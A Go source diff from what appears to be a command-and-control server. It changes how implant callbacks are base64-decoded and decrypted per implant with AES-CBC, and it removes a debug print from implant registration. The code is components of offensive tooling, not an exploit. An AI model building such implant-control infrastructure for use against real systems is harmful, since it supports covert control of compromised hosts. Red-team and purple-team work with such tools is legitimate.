@@ -14,8 +14,35 @@ import (
 	"purpcmd/server/log"
 )
 
-func ParseCallback(d io.ReadCloser, req *http.Request) (uint16, []byte) {
-	r := base64.NewDecoder(base64.StdEncoding, d)
+func ParseCallback(d []byte, req *http.Request, name string) (uint16, []byte) {
+	var r io.Reader
+
+	if name == "" {
+		dataB64 := make([]byte, base64.StdEncoding.DecodedLen(len(d)))
+		n, _ := base64.StdEncoding.Decode(dataB64, d)
+		r = bytes.NewReader(dataB64[:n])
+
+	} else {
+		imp := ImplantPtrByName(name)
+		if imp == nil {
+			return internal.NIL,[]byte{}
+		}
+
+
+		dataB64 := make([]byte, base64.StdEncoding.DecodedLen(len(d)))
+		n, _ := base64.StdEncoding.Decode(dataB64, d)
+
+
+		data, err := imp.enc.AESCbcDecrypt(dataB64[:n])
+		if err != nil {
+			panic(err)
+		}
+
+		r = bytes.NewReader(data)
+	}
+
+
+
 	var messageType uint16
 
 	err := binary.Read(r, binary.BigEndian, &messageType)
@@ -66,7 +93,6 @@ func ParseAndReg(r io.Reader, req *http.Request) error {
 
 	dataS := bytes.Split(data, SEP)
 	if len(dataS) != 3 {
-		fmt.Println("data must have 3 entities and have ", i.PID, data)
 		return errors.New("data must have 3 entities and have")
 	}
 	i.Proc = string(dataS[0])
